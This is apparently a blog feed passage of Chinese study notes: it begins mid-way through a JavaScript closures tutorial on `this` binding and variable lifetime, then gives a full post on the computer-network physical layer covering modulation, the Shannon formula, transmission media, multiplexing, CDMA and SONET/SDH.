class="string">'orange'</span>,</span><br><span class="line">        price: <span class="number">12</span></span><br><span class="line">    &#125;, </span><br><span class="line">    &#123;</span><br><span class="line">        title: <span class="string">'egg'</span>,</span><br><span class="line">        price: <span class="number">2</span></span><br><span class="line">    &#125;, </span><br><span class="line">    &#123;</span><br><span class="line">        title: <span class="string">'milk'</span>,</span><br><span class="line">        price: <span class="number">6</span></span><br><span class="line">    &#125;, </span><br><span class="line">    &#123;</span><br><span class="line">        title: <span class="string">'pineapple'</span>,</span><br><span class="line">        price: <span class="number">13</span></span><br><span class="line">    &#125;, </span><br><span class="line">    &#123;</span><br><span class="line">        title: <span class="string">'lemon'</span>,</span><br><span class="line">        price: <span class="number">5</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> i.price &gt;= a &amp;&amp; i.price &lt;= b</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.table(commodity.filter(<span class="keyword">get</span>(1,10)))//需要f5一下</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：用到return是因为我们需要到这个函数体内的值，不能说他就是闭包的一部分。</p><p><img src= "/img/loading.gif" data-src="/2021/03/06/%E9%97%AD%E5%8C%85/image-20210312153842288.png" alt="image-20210312153842288"></p><h1 id="闭包中this的指向问题"><a href="#闭包中this的指向问题" class="headerlink" title="闭包中this的指向问题"></a>闭包中this的指向问题</h1><p>下面有这么一段代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fruit = &#123;</span><br><span class="line">    name: <span class="string">'apple'</span>,</span><br><span class="line">    say: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来输出这个结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = fruit.say()</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br></pre></td></tr></table></figure><p>果不其然，和我们预想的一样，它输出的结果就是apple，因为this指向的是调用该方法的对象，即fruit，所以自然而然地就输出name属性了</p><p>然后，让我们来看看下面这个场景，当我们使用了闭包呢，又会发生什么样的现象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fruit = &#123;</span><br><span class="line">    name: <span class="string">'apple'</span>,</span><br><span class="line">    say: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.name</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面两段代码等同于console.log(fruit.say()())</span></span><br><span class="line"><span class="keyword">let</span> a = fruit.say()</span><br><span class="line"><span class="built_in">console</span>.log(a()) <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure><p>是的，没错，输出结果就跟注释一样，是undefined，为什么呢，仔细看看，你会发现，首先我们调用了fruit中的say()方法，然后用a去接收，接着在我们打印a()时，这个时候函数体内的this指向的其实就是window对象（也就是说，我们在全局window对象中调用了a()这个方法），于是乎，它找不到window中的name属性，也就打印出了undefined，这个就是在使用闭包时可能会遇到的问题，也是在箭头函数未出现前会出现的问题</p><p>解决方法有两种，如果前面有仔细阅读的话，你就会发现，其中一种就是用箭头函数去解决这个问题，下面放出两段解决方法</p><ul><li><p>方法一</p><p>我们只需要修改两行代码，一个就是接收对象，另一个则为调用这个对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fruit = &#123;</span><br><span class="line">    name: <span class="string">'apple'</span>,</span><br><span class="line">    say: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> This = <span class="keyword">this</span> <span class="comment">//定义变量接收该对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> This.name <span class="comment">//使用</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>方法二（提倡）</p><p>使用箭头函数替代</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fruit = &#123;</span><br><span class="line">    name: <span class="string">'apple'</span>,</span><br><span class="line">    say: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.name</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="变量的生命周期"><a href="#变量的生命周期" class="headerlink" title="变量的生命周期"></a>变量的生命周期</h1><p>对于全局变量来说，它们的生命周期是<strong>永久</strong>的，除非我们主动去销毁它</p><p>对于函数作用域下的变量来说，当函数执行完退出后，这些变量就失去了价值，也会随着函数的退出而消失</p><p>而在闭包里，同样都是函数，只不过是以嵌套的形式呈现，这个变量就不会被销毁呢</p><p>回到前面this的指向问题中的代码例子中去，当我们在执行var a = fruit.say()时，首先它会在执行say()时返回一个匿名函数的引用，它可以访问到a()被调用时产生的环境，局部变量就会一直存在在这个环境里（这里每定义变量可能不是很明显，下面会有另一个例子），而当我们需要频繁调用a()时，这个变量就会一直被用到，那么它就没有被销毁的理由，所以就会一直存在了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通函数</span></span><br><span class="line"><span class="keyword">var</span> reduce1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">1</span></span><br><span class="line">  b--</span><br><span class="line">  <span class="built_in">console</span>.log(b)</span><br><span class="line">&#125;</span><br><span class="line">reduce1() <span class="comment">//0</span></span><br><span class="line">reduce1() <span class="comment">//0 重新生成变量，下同</span></span><br><span class="line">reduce1() <span class="comment">//0</span></span><br><span class="line">reduce1() <span class="comment">//0</span></span><br><span class="line">reduce1() <span class="comment">//0</span></span><br><span class="line">reduce1() <span class="comment">//0</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">//闭包</span></span><br><span class="line"><span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> a = <span class="number">1</span></span><br><span class="line">     <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       a++</span><br><span class="line">       <span class="built_in">console</span>.log(a)</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">var</span> add1 = add() <span class="comment">//产生一个临时环境存储变量</span></span><br><span class="line">   add1() <span class="comment">//2</span></span><br><span class="line">   add1() <span class="comment">//3</span></span><br><span class="line">   add1() <span class="comment">//4</span></span><br><span class="line">   add1() <span class="comment">//5</span></span><br><span class="line">   add1() <span class="comment">//6</span></span><br><span class="line">   add1() <span class="comment">//7</span></span><br></pre></td></tr></table></figure><h1 id="闭包的更多作用"><a href="#闭包的更多作用" class="headerlink" title="闭包的更多作用*"></a>闭包的更多作用*</h1><blockquote><p>可以看看《JavaScript设计模式与开发实践》这本书有关闭包的相关内容</p></blockquote><ol><li>封装变量</li><li>闭包和面向对象设计</li><li>用闭包实现命令模式</li><li>内存管理</li></ol>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-物理层</title>
      <link href="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/"/>
      <url>/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<blockquote><p>注：内容根据《计算机网络第七版》以及相关PPT整理制作，图片主要源于{电子工程出版社}，部分图片源于学校老师上课所画的图以及自己制作的思维导图</p></blockquote><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><blockquote><p>物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输<strong>数据比特流</strong>，而不是指具体的传输媒体。</p><p>物理层的作用是要尽可能地屏蔽掉不同传输媒体和通信手段的差异</p><p>用于物理层的协议也常称为物理层规程 (procedure)</p></blockquote><p>物理层的<strong>主要任务</strong>：确定传输媒体的接口的一些特性，包括以下四个方面</p><ol><li><strong>机械特性：</strong>指明接口所用接线器的形状和尺寸、引线数目和排列、固定和锁定装置等</li><li><strong>电气特性：</strong>指明在接口电缆的各条线上出现的电压的范围</li><li><strong>功能特性：</strong>指明某条线上出现的某一电平的电压的意义</li><li><strong>过程特性：</strong>指明对于不同功能的各种可能事件的出现顺序</li></ol><p>因为计算机内部多采用并行传输的方式。而单数据在通信信道（传输媒体）上的传输方式一般是串行传输，所以物理层还要完成传输方式的转换，在了解该知识前我们首先要了解数据通信相关知识</p><h1 id="数据通信的基础知识"><a href="#数据通信的基础知识" class="headerlink" title="数据通信的基础知识"></a>数据通信的基础知识</h1><h2 id="数据通信系统基本模型"><a href="#数据通信系统基本模型" class="headerlink" title="数据通信系统基本模型"></a>数据通信系统基本模型</h2><p>一个数据通信系统包括三大部分：源系统（或发送端、发送方）、传输系统（或传输网络）和目的系统（或接收端、接收方）</p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305104927350.png" alt="image-20210305104927350"></p><h2 id="信号的传输"><a href="#信号的传输" class="headerlink" title="信号的传输"></a>信号的传输</h2><p><strong>通信的目的就是要传送信息</strong>，如语音、文字、图像等，而<strong>数据是运送信息的实体</strong>，<strong>信号便是数据的电子或电磁的表现</strong>了</p><p>信号又可以分为两种类型</p><ol><li><strong>模拟信号(analogous signal)</strong> ：即连续信号——代表消息的参数的取值是连续的</li><li><strong>数字信号 (digital signal)</strong> ：即离散信号—— 代表消息的参数的取值是离散的</li></ol><p>信号在<strong>信道</strong>上传输，下面就介绍信道的几个重要名词的解释</p><ul><li><p><strong>信道</strong>：一般用来表示向某一个方向传送信息的媒体。</p></li><li><p><strong>单向通信（单工通信）</strong>：只能有一个方向的通信而没有反方向的交互。</p></li><li><p><strong>双向交替通信（半双工通信）</strong>：通信的双方都可以发送信息，但不能双方同时发送(当然也就不能同时接收)。</p></li><li><p><strong>双向同时通信（全双工通信）</strong>：通信的双方可以同时发送和接收信息。 </p></li><li><p><strong>基带信号（即基本频带信号）</strong>：来自信源的信号。像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。</p></li><li><p><strong>码元 (code)</strong> —— 在使用时间域（或简称为时域）的波形表示数字信号时，代表不同离散数值的基本波形。</p><blockquote><p>基带信号往往包含有较多的低频成分，甚至有直流成分，而许多信道并不能传输这种低频分量或直流分量。因此必须对基带信号进行调制 (modulation)。 </p></blockquote></li></ul><h2 id="调制"><a href="#调制" class="headerlink" title="调制"></a>调制</h2><p>调制同样可以分为两类一类是<strong>基带调制</strong>、一类为<strong>载波调制</strong></p><ol><li><p><strong>基带调制</strong>：仅对基带信号的波形进行变换，使它能够与信道特性相适应。变换后的信号<strong>仍然</strong>是基带信号。把这种过程称为<strong>编码 (coding)</strong>。下面列举了常用的几种编码方式</p><ul><li><strong>不归零制：</strong>正电平代表 1，负电平代表 0。</li><li><strong>归零制：</strong>正脉冲代表 1，负脉冲代表 0。</li><li><strong>曼彻斯特编码：</strong>位周期中心的向上跳变代表 0，位周期中心的向下跳变代表 1。但也可反过来定义。</li><li><strong>差分曼彻斯特编码：</strong>在每一位的中心处始终都有跳变。位开始边界有跳变代表 0，而位开始边界没有跳变代表 1。</li><li>由下图来帮助理解这几种编码方式</li></ul><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305110852018.png" alt="image-20210305110852018"></p></li><li><p><strong>带通调制</strong>：使用<strong>载波 (carrier)</strong>进行调制，把基带信号的频率范围搬移到较高的频段，并转换为<strong>模拟信号</strong>，这样就能够更好地在模拟信道中传输（即仅在一段频率范围内能够通过信道）</p><ul><li>而经过载波调制后得到的信号我们一般称为<strong>带通信号</strong></li></ul></li></ol><h2 id="带通调制方法"><a href="#带通调制方法" class="headerlink" title="带通调制方法"></a>带通调制方法</h2><p>了解了这两种调制方法后，我们来看看几种基本的带通调制方法</p><ol><li><p><strong>调幅(AM)：</strong>载波的振幅随基带数字信号而变化。 </p></li><li><p><strong>调频(FM)：</strong>载波的频率随基带数字信号而变化。</p></li><li><p><strong>调相(PM) ：</strong>载波的初始相位随基带数字信号而变化。</p></li></ol><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305111139110.png" alt="image-20210305111139110"></p><h2 id="信道极限速率"><a href="#信道极限速率" class="headerlink" title="信道极限速率"></a>信道极限速率</h2><blockquote><p>任何实际的信道都不是理想的，在传输信号时会产生各种失真以及带来多种干扰。 </p><p>码元传输的<strong>速率越高</strong>，或信号传输的距离越远，或传输媒体<strong>质量越差</strong>，在信道的输出端的波形的<strong>失真就越严重</strong>。</p></blockquote><p>这里面的码元是什么意思，我们来看看它的名词解释</p><p><strong>码元 (code)</strong> —— 在使用时间域（或简称为时域）的波形表示数字信号时，代表不同离散数值的基本波形。</p><p>我们再通过一幅图来进一步理解信号在传输过程中的损耗</p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305111411253.png" alt="image-20210305111411253"></p><p>总的来说限制码元在信道上的传输速率的因素有以下两个</p><ul><li>信道能够通过的频率范围</li><li>信噪比</li></ul><h3 id="信噪比"><a href="#信噪比" class="headerlink" title="信噪比"></a>信噪比</h3><ul><li>噪声存在于所有的电子设备和通信信道中。</li><li>噪声是随机产生的，它的瞬时值有时会很大。因此噪声会使接收端对码元的判决产生错误。</li><li>但噪声的影响是相对的。如果信号相对较强，那么噪声的影响就相对较小。</li><li>信噪比就是信号的平均功率和噪声的平均功率之比。常记为<em>S/N<em>，并用分贝 (dB) 作为度量单位。即：信噪比(dB) = 10 log10(</em>S/N</em> ) (dB)</li></ul><p>1984年，香农 (Shannon) 用信息论的理论推导出了带宽受限且有高斯白噪声干扰的信道的极限、无差错的信息传输速率（<strong>香农公式</strong>），具体的香农公式的解释可以上百度查找阅读</p><blockquote><p>C = W log2(1+S/N)    (bit/s) </p><p>W 为信道的带宽（以 Hz 为单位）；<br>S 为信道内所传信号的平均功率；<br>N 为信道内部的高斯噪声功率。 </p></blockquote><p>简单的香农公式说明</p><ul><li>信道的带宽或信道中的信噪比越大，则信息的极限传输速率就越高。 </li><li>只要信息传输速率低于信道的极限信息传输速率，就一定可以找到某种办法来实现无差错的传输。 </li><li>若信道带宽 W 或信噪比 S/N 没有上限（当然实际信道不可能是这样的），则信道的极限信息传输速率 C 也就没有上限。</li><li>实际信道上能够达到的信息传输速率要比香农的极限传输速率低不少。 </li></ul><h3 id="传输速率进一步提高"><a href="#传输速率进一步提高" class="headerlink" title="传输速率进一步提高"></a>传输速率进一步提高</h3><p>对于频带宽度已确定的信道，如果信噪比不能再提高了，并且码元传输速率也达到了上限值，那么还有办法提高信息的传输速率。</p><p>这就是：<strong>用编码的方法让每一个码元携带更多比特的信息量。</strong></p><h1 id="物理层下面的传输媒体"><a href="#物理层下面的传输媒体" class="headerlink" title="物理层下面的传输媒体"></a>物理层下面的传输媒体</h1><blockquote><p>传输媒体也称为传输介质或传输媒介，它就是数据传输系统中在发送器和接收器之间的物理通路</p></blockquote><p>主要有两种传输媒体</p><ul><li>导引型传输媒体</li><li>非导引型传输媒体</li></ul><h2 id="导引型传输媒体"><a href="#导引型传输媒体" class="headerlink" title="导引型传输媒体"></a>导引型传输媒体</h2><blockquote><p>在导引型传输媒体中，电磁波被导引沿着固体媒体（铜线或光纤）传播</p></blockquote><h3 id="双绞线"><a href="#双绞线" class="headerlink" title="双绞线"></a>双绞线</h3><ul><li>最常用的传输媒体。模拟传输和数字传输都可以使用双绞线，其通信距离一般为几到十几公里。</li><li>屏蔽双绞线STP (Shielded Twisted Pair)，带金属屏蔽层</li><li>无屏蔽双绞线 UTP (Unshielded Twisted Pair)、</li></ul><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305112230055.png" alt="image-20210305112230055"></p><h3 id="同轴电缆"><a href="#同轴电缆" class="headerlink" title="同轴电缆"></a>同轴电缆</h3><ul><li>同轴电缆具有很好的抗干扰特性，被广泛用于传输较高速率的数据。</li><li>同轴电缆的带宽取决于电缆的质量。</li><li><strong>50 Ω 同轴电缆 —— LAN / 数字传输常用</strong></li><li><strong>75 Ω 同轴电缆 —— 有线电视 / 模拟传输常用</strong></li></ul><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305112320515.png" alt="image-20210305112320515"></p><h3 id="光缆"><a href="#光缆" class="headerlink" title="光缆"></a>光缆</h3><ul><li>光纤是光纤通信的传输媒体</li><li>由于可见光的频率非常高，约为 108 MHz 的量级，因此一个光纤通信系统的传输带宽远远大于目前其他各种传输媒体的带宽</li></ul><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305112358845.png" alt="image-20210305112358845"></p><p>由图可知，当光线从高折射率的媒体射向低折射率的媒体时，其折射角将大于入射角。因此，如果入射角足够大，就会出现全反射，光也就沿着光纤传输下去。</p><p>光纤还可以进一步分为两种类型</p><ol><li><p><strong>多模光纤</strong> </p><p>可以存在多条不同角度入射的光线在一条光纤中传输。这种光纤就称为多模光纤。</p></li><li><p><strong>单模光纤</strong></p><p> 若光纤的直径减小到只有一个光的波长，则光纤就像一根波导那样，它可使光线一直向前传播，而不会产生多次反射。这样的光纤称为单模光纤。</p></li></ol><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305112628886.png" alt="image-20210305112628886"></p><h4 id="光纤的优点"><a href="#光纤的优点" class="headerlink" title="光纤的优点"></a>光纤的优点</h4><ol><li><p>通信容量非常大。</p></li><li><p>传输损耗小，中继距离长。</p></li><li><p>抗雷电和电磁干扰性能好。</p></li><li><p>无串音干扰，保密性好。</p></li><li><p>体积小，重量轻。</p></li></ol><h2 id="非导引型传输媒体"><a href="#非导引型传输媒体" class="headerlink" title="非导引型传输媒体"></a>非导引型传输媒体</h2><blockquote><p>非导引型传输媒体就是指自由空间。在非导引型传输媒体中，电磁波的传输常称为无线传输</p></blockquote><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li><p>将自由空间称为“非导引型传输媒体”。</p></li><li><p>无线传输所使用的频段很广。</p></li><li><p>短波通信（即高频通信）主要是靠电离层的反射，但短波信道的通信质量较差，传输速率低。</p></li><li><p>微波在空间主要是直线传播。</p></li><li><p>传统微波通信有两种方式： </p><ol><li>地面微波接力通信</li></ol></li></ul><ol start="2"><li>卫星通信 </li></ol><p>要使用某一段无线电频谱进行通信，通常必须得到本国政府有关无线电频谱管理机构的许可证。但是，也有一些无线电频段是可以自由使用的。例如：ISM。各国的 ISM 标准有可能略有差别。</p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210414103102557.png" alt="image-20210414103102557"></p><h1 id="信道复用技术"><a href="#信道复用技术" class="headerlink" title="信道复用技术"></a>信道复用技术</h1><p>首先了解一下复用的概念</p><blockquote><p>复用 (multiplexing) 是通信技术中的基本概念。它允许用户使用一个共享信道进行通信，降低成本，提高利用率。</p></blockquote><h2 id="频分复用"><a href="#频分复用" class="headerlink" title="频分复用"></a>频分复用</h2><p>将整个带宽分为多份，用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。</p><p>频分复用的所有用户在同样的时间占用不同的带宽资源（请注意，这里的“带宽”是<strong>频率带宽</strong>而不是数据的发送速率）。 </p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305113007474.png" alt="image-20210305113007474"></p><h2 id="时分复用"><a href="#时分复用" class="headerlink" title="时分复用"></a>时分复用</h2><p><strong>时分复用</strong>则是将时间划分为一段段等长的<strong>时分复用帧</strong>（TDM帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。</p><p>每一个用户所占用的时隙是周期性地出现（其周期就是TDM帧的长度）的。</p><p>TDM 信号也称为等时 (isochronous) 信号。</p><p>时分复用的所有用户在不同的时间占用同样的频带宽度。</p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305113044934.png" alt="image-20210305113044934"></p><p>使用时分复用系统传送计算机数据时，由于计算机数据的突发性质，用户对分配到的子信道的利用率一般是不高的</p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305113121541.png" alt="image-20210305113121541"></p><h2 id="统计时分复用"><a href="#统计时分复用" class="headerlink" title="统计时分复用"></a>统计时分复用</h2><p>直接上图理解</p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305113155761.png" alt="image-20210305113155761"></p><p>从图中可以看出，在输出线路上，某一个用户所占用的时隙并不是周期性地出现，因此统计复用又称为<strong>异步时分复用</strong>，而普通地时分复用又称为<strong>同步时分复用</strong></p><p>这里要注意的是：集中器能正常工作的前提是各用户都是间歇的工作，因为如果当所有的用户都不间断的向集中器发送数据，集中器是无法应对的，它内部设置的缓存都将会溢出</p><h2 id="波分复用-WDM"><a href="#波分复用-WDM" class="headerlink" title="波分复用 WDM"></a>波分复用 WDM</h2><p><strong>波分复用就是光的频分复用</strong>，它使用一根光纤来同时传输多个光载波信号。</p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210414104403145.png" alt="image-20210414104403145"></p><h2 id="码分复用"><a href="#码分复用" class="headerlink" title="码分复用"></a>码分复用</h2><ul><li>人们对其更常用的名词是<strong>码分多址 CDMA (Code Division Multiple Access)</strong>。</li><li>各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。</li><li>这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。</li></ul><h3 id="码片序列"><a href="#码片序列" class="headerlink" title="码片序列"></a>码片序列</h3><ul><li><p>每一个比特时间划分为 m 个短的间隔，称为码片 (chip)。</p></li><li><p>每个站被指派一个唯一的 m bit 码片序列。</p><ol><li>如发送比特 1，则发送自己的 m bit 码片序列。</li><li>如发送比特 0，则发送该码片序列的二进制反码。</li></ol><p>例如，S 站的 8 bit 码片序列是 00011011。<br>发送比特 1 时，就发送序列 00011011，<br>发送比特 0 时，就发送序列 11100100。<br>S 站的码片序列：(–1 –1 –1 +1 +1 –1 +1 +1) </p></li></ul><p><strong>码片序列实现了扩频</strong></p><p>假定S站要发送信息的数据率为 b bit/s。由于每一个比特要转换成 m 个比特的码片，因此 S 站实际上发送的数据率提高到 mb bit/s，同时 S 站所占用的频带宽度也提高到原来数值的 m 倍。这种通信方式是<strong>扩频(spread spectrum)通信</strong>中的一种。</p><p>扩频通信通常有两大类：</p><ol><li>一种是<strong>直接序列扩频DSSS</strong> (Direct Sequence Spread Spectrum)，如上面讲的使用码片序列就是这一类。</li><li>另一种是<strong>跳频扩频FHSS</strong> (Frequency Hopping Spread Spectrum)。</li></ol><h3 id="CDMA-的重要特点"><a href="#CDMA-的重要特点" class="headerlink" title="CDMA 的重要特点"></a>CDMA 的重要特点</h3><p>每个站分配的码片序列不仅<strong>必须各不相同</strong>，并且还<strong>必须互相正交 (orthogonal)</strong>。</p><p>在实用的系统中是使用<strong>伪随机码序列</strong>。</p><h3 id="码片序列的正交关系"><a href="#码片序列的正交关系" class="headerlink" title="码片序列的正交关系"></a>码片序列的正交关系</h3><p> 令向量 S 表示站 S 的码片向量，令 T 表示其他任何站的码片向量。<br>两个不同站的码片序列正交，就是向量 S 和T 的规格化内积 (inner product) 等于 0： </p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210414105553305.png" alt="image-20210414105553305"></p><p>任何一个码片向量和该码片向量自己的规格化内积都是 1 。</p><p>一个码片向量和该码片反码的向量的规格化内积值是 –1。 </p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210414105601301.png" alt="image-20210414105601301"></p><p>好吧，其实这个过程自己不是很懂，后面再来补</p><p>最后放出CDMA的完整工作图</p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210414105701421.png" alt="image-20210414105701421"></p><h1 id="数字传输系统"><a href="#数字传输系统" class="headerlink" title="数字传输系统"></a>数字传输系统</h1><ul><li><p>在早期电话网中，从市话局到用户电话机的用户线是采用最廉价的双绞线电缆，而长途干线采用的是<strong>频分复用 FDM</strong> 的模拟传输方式。</p></li><li><p>与模拟通信相比，数字通信无论是在传输质量上还是经济上都有明显的优势。</p></li><li><p>目前，长途干线大都采用<strong>时分复用 PCM</strong> 的数字传输方式。</p></li><li><p>脉码调制 PCM 体制最初是为了在电话局之间的中继线上传送多路的电话。</p></li><li><p>由于历史上的原因，PCM 有两个互不兼容的国际标准：</p><ol><li><p>北美的 24 路 PCM（简称为 T1）</p></li><li><p>欧洲的 30 路 PCM（简称为 E1）</p></li></ol></li><li><p>我国采用的是欧洲的 E1 标准。</p></li><li><p>E1 的速率是 2.048 Mbit/s，而 T1 的速率是 1.544 Mbit/s。</p></li><li><p>当需要有更高的数据率时，可采用复用的方法。 </p></li></ul><h2 id="旧的数字传输系统存在许多缺点"><a href="#旧的数字传输系统存在许多缺点" class="headerlink" title="旧的数字传输系统存在许多缺点"></a>旧的数字传输系统存在许多缺点</h2><ul><li><strong>速率标准不统一</strong><ol><li>如果不对高次群的数字传输速率进行标准化，国际范围的基于光纤高速数据传输就很难实现。 </li></ol></li><li><strong>不是同步传输</strong><ol><li>在过去相当长的时间，为了节约经费，各国的数字网主要采用准同步方式。  </li><li>当数据传输的速率很高时，收发双方的时钟同步就成为很大的问题。</li></ol></li></ul><h2 id="同步光纤网"><a href="#同步光纤网" class="headerlink" title="同步光纤网"></a>同步光纤网</h2><p><strong>同步光纤网 SONET (Synchronous Optical Network)</strong>  的各级时钟都来自一个非常精确的主时钟。 SONET 为光纤传输系统定义了同步传输的线路速率等级结构</p><ol><li>对电信信号称为第 1 级<strong>同步传送信号 STS-1</strong> (Synchronous Transport Signal)，其传输速率是 51.84 Mbit/s。</li><li>对光信号则称为第 1 级<strong>光载波 OC-1</strong> (OC 表示Optical Carrier)。</li></ol><p>现已定义了从 51.84 Mbit/s (即OC-1) 一直到 9953.280 Mbit/s (即 OC-192/STS-192) 的标准。 </p><h2 id="同步数字系列-SDH"><a href="#同步数字系列-SDH" class="headerlink" title="同步数字系列 SDH"></a>同步数字系列 SDH</h2><p>ITU-T 以美国标准 SONET 为基础，制订出国际标准同步数字系列 SDH (Synchronous Digital Hierarchy)。<strong>一般可认为 SDH 与 SONET 是同义词。</strong></p><p><strong>其主要不同点是：</strong>SDH的基本速率为155.52 Mbit/s，称为第 1 级同步传递模块 (Synchronous Transfer Module)，即 STM-1，相当于 SONET 体系中的 OC-3 速率。 